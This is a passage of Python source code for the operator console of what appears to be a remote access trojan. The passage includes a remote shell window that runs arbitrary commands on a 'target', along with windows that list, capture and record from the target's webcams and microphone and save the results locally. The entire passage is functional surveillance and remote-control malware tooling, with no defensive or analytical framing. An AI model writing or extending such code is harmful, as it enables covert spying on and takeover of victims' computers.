        self.output_text.insert(tk.END, f"◉ REMOTE SHELL ESTABLISHED ◉\n")
        self.output_text.insert(tk.END, f"Target: {self.client_id}\n")
        self.output_text.insert(tk.END, "=" * 50 + "\n\n")

    def execute_command(self, event=None):
        command = self.command_entry.get().strip()
        if not command:
            return
            
        self.output_text.insert(tk.END, f"$ {command}\n")
        self.command_entry.delete(0, tk.END)
        
        result = self.parent.send_command(self.client_id, 'execute_command', {'command': command})
        
        if result:
            if 'output' in result:
                self.output_text.insert(tk.END, result['output'] + "\n\n")
            elif 'error' in result:
                self.output_text.insert(tk.END, f"ERROR: {result['error']}\n\n")
        else:
            self.output_text.insert(tk.END, "ERROR: No response from target\n\n")
        
        self.output_text.see(tk.END)


class WebcamControlWindow:
    def __init__(self, parent, client_id):
        self.parent = parent
        self.client_id = client_id
        
        self.window = tk.Toplevel(parent.root)
        self.window.title(f"◉ WEBCAM CONTROL: {client_id} ◉")
        self.window.geometry("800x700")
        self.window.configure(bg=parent.colors['bg_primary'],
                             highlightbackground=parent.colors['accent_green'], 
                             highlightthickness=2)
        
        self.create_widgets()
        self.list_cameras()

    def create_widgets(self):
        # Camera selection
        control_frame = tk.Frame(self.window, bg=self.parent.colors['bg_secondary'])
        control_frame.pack(fill='x', padx=10, pady=10)
        
        tk.Label(control_frame, text="CAMERA:", bg=self.parent.colors['bg_secondary'],
                fg=self.parent.colors['text_primary'], font=('Consolas', 10)).pack(side='left')
        
        self.camera_var = tk.StringVar()
        self.camera_combo = ttk.Combobox(control_frame, textvariable=self.camera_var, state='readonly')
        self.camera_combo.pack(side='left', padx=5)
        
        # Buttons
        ttk.Button(control_frame, text="◉ CAPTURE", command=self.capture_image,
                  style='HackerGreen.TButton').pack(side='left', padx=5)
        ttk.Button(control_frame, text="◉ RECORD VIDEO", command=self.record_video,
                  style='HackerBlue.TButton').pack(side='left', padx=5)
        ttk.Button(control_frame, text="◉ REFRESH", command=self.list_cameras,
                  style='HackerBlue.TButton').pack(side='left', padx=5)
        
        # Image display
        self.image_frame = tk.Frame(self.window, bg=self.parent.colors['bg_secondary'],
                                   highlightbackground=self.parent.colors['border'], 
                                   highlightthickness=1)
        self.image_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.image_label = tk.Label(self.image_frame, text="◇ CAMERA FEED ◇",
                                   bg=self.parent.colors['bg_secondary'],
                                   fg=self.parent.colors['text_secondary'],
                                   font=('Consolas', 12))
        self.image_label.pack(expand=True)

    def list_cameras(self):
        result = self.parent.send_command(self.client_id, 'list_cameras')
        if result and 'cameras' in result:
            cameras = [f"Camera {cam['index']}" for cam in result['cameras']]
            self.camera_combo['values'] = cameras
            if cameras:
                self.camera_combo.current(0)

    def capture_image(self):
        if not self.camera_var.get():
            messagebox.showwarning("CAMERA ERROR", "Select a camera first")
            return
        
        camera_index = int(self.camera_var.get().split()[-1])
        result = self.parent.send_command(self.client_id, 'capture_webcam', 
                                        {'camera_index': camera_index})
        
        if result and 'image' in result:
            self.display_image(result['image'])
        elif result and 'error' in result:
            messagebox.showerror("CAPTURE ERROR", result['error'])

    def display_image(self, image_data):
        try:
            image_bytes = base64.b64decode(image_data)
            image = Image.open(io.BytesIO(image_bytes))
            image.thumbnail((600, 400), Image.Resampling.LANCZOS)
            
            photo = ImageTk.PhotoImage(image)
            self.image_label.configure(image=photo, text="")
            self.image_label.image = photo
        except Exception as e:
            messagebox.showerror("DISPLAY ERROR", str(e))

    def record_video(self):
        if not self.camera_var.get():
            messagebox.showwarning("CAMERA ERROR", "Select a camera first")
            return
        
        duration = tk.simpledialog.askinteger("RECORD DURATION", "Enter duration (seconds):", 
                                            initialvalue=10, minvalue=1, maxvalue=60)
        if not duration:
            return
        
        camera_index = int(self.camera_var.get().split()[-1])
        messagebox.showinfo("RECORDING", f"Recording {duration} seconds of video...")
        
        result = self.parent.send_command(self.client_id, 'record_video', 
                                        {'camera_index': camera_index, 'duration': duration})
        
        if result and 'video' in result:
            filename = filedialog.asksaveasfilename(defaultextension=".avi",
                                                  filetypes=[("AVI files", "*.avi")])
            if filename:
                try:
                    video_data = base64.b64decode(result['video'])
                    with open(filename, 'wb') as f:
                        f.write(video_data)
                    messagebox.showinfo("SUCCESS", f"Video saved: {filename}")
                except Exception as e:
                    messagebox.showerror("SAVE ERROR", str(e))
        elif result and 'error' in result:
            messagebox.showerror("RECORDING ERROR", result['error'])


class AudioControlWindow:
    def __init__(self, parent, client_id):
        self.parent = parent
        self.client_id = client_id
        self.recording = False
        
        self.window = tk.Toplevel(parent.root)
        self.window.title(f"◉ AUDIO CONTROL: {client_id} ◉")
        self.window.geometry("600x400")
        self.window.configure(bg=parent.colors['bg_primary'],
                             highlightbackground=parent.colors['accent_green'], 
                             highlightthickness=2)
        
        self.create_widgets()
        self.list_audio_devices()

    def create_widgets(self):
        # Device selection
        control_frame = tk.Frame(self.window, bg=self.parent.colors['bg_secondary'])
        control_frame.pack(fill='x', padx=10, pady=10)
        
        tk.Label(control_frame, text="DEVICE:", bg=self.parent.colors['bg_secondary'],
                fg=self.parent.colors['text_primary'], font=('Consolas', 10)).pack(side='left')
        
        self.device_var = tk.StringVar()
        self.device_combo = ttk.Combobox(control_frame, textvariable=self.device_var, 
                                        state='readonly', width=30)
        self.device_combo.pack(side='left', padx=5)
        
        # Duration
        tk.Label(control_frame, text="DURATION:", bg=self.parent.colors['bg_secondary'],
                fg=self.parent.colors['text_primary'], font=('Consolas', 10)).pack(side='left', padx=(20, 0))
        
        self.duration_var = tk.StringVar(value="10")
        duration_entry = tk.Entry(control_frame, textvariable=self.duration_var, width=5,
                                 bg=self.parent.colors['bg_tertiary'], 
                                 fg=self.parent.colors['accent_green'])
        duration_entry.pack(side='left', padx=5)
        
        # Buttons
        btn_frame = tk.Frame(self.window, bg=self.parent.colors['bg_secondary'])
        btn_frame.pack(fill='x', padx=10, pady=10)
        
        self.record_btn = ttk.Button(btn_frame, text="◉ START RECORDING", 
                                    command=self.start_recording, style='HackerGreen.TButton')
        self.record_btn.pack(side='left', padx=5)
        
        self.stop_btn = ttk.Button(btn_frame, text="◉ STOP RECORDING", 
                                  command=self.stop_recording, style='HackerRed.TButton', 
                                  state='disabled')
        self.stop_btn.pack(side='left', padx=5)
        
        ttk.Button(btn_frame, text="◉ REFRESH", command=self.list_audio_devices,
                  style='HackerBlue.TButton').pack(side='left', padx=5)
        
        # Status
        self.status_label = tk.Label(self.window, text="◇ READY ◇",
                                    bg=self.parent.colors['bg_primary'],
                                    fg=self.parent.colors['text_secondary'],
                                    font=('Consolas', 12))
        self.status_label.pack(pady=20)

    def list_audio_devices(self):
        result = self.parent.send_command(self.client_id, 'list_audio_devices')
        if result and 'devices' in result:
            devices = [f"{dev['name']} (Index: {dev['index']})" for dev in result['devices']]
            self.device_combo['values'] = devices
            if devices:
                self.device_combo.current(0)

    def start_recording(self):
        if not self.device_var.get():
            messagebox.showwarning("DEVICE ERROR", "Select an audio device first")
            return
        
        try:
            duration = int(self.duration_var.get())
            device_index = int(self.device_var.get().split("Index: ")[-1].rstrip(")"))
            
            result = self.parent.send_command(self.client_id, 'record_audio', 
                                            {'device_index': device_index, 'duration': duration})
            
            if result and result.get('status') == 'recording_started':
                self.recording = True
                self.record_btn.config(state='disabled')
                self.stop_btn.config(state='normal')
                self.status_label.config(text=f"◇ RECORDING... ({duration}s) ◇", 
                                       fg=self.parent.colors['accent_red'])
                
                # Auto-stop after duration
                self.window.after(duration * 1000, self.auto_stop_recording)
                
            elif result and 'error' in result:
                messagebox.showerror("RECORDING ERROR", result['error'])
                
        except ValueError:
            messagebox.showerror("INPUT ERROR", "Invalid duration")

    def stop_recording(self):
        result = self.parent.send_command(self.client_id, 'stop_audio_recording')
        
        if result and 'audio' in result:
            filename = filedialog.asksaveasfilename(defaultextension=".wav",
                                                  filetypes=[("WAV files", "*.wav")])
            if filename:
                try:
                    audio_data = base64.b64decode(result['audio'])
                    with open(filename, 'wb') as f:
                        f.write(audio_data)
                    messagebox.showinfo("SUCCESS", f"Audio saved: {filename}")
                except Exception as e:
                    messagebox.showerror("SAVE ERROR", str(e))
        elif result and 'error' in result:
            messagebox.showerror("RECORDING ERROR", result['error'])
        
        self.reset_recording_state()

    def auto_stop_recording(self):
        if self.recording:
            self.stop_recording()

    def reset_recording_state(self):
        self.recording = False
        self.record_btn.config(state='normal')
        self.stop_btn.config(state='disabled')
        self.status_label.config(text="◇ READY ◇", fg=self.parent.colors['text_secondary'])


def main():
    root = tk.Tk()
    app = RemoteServerGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()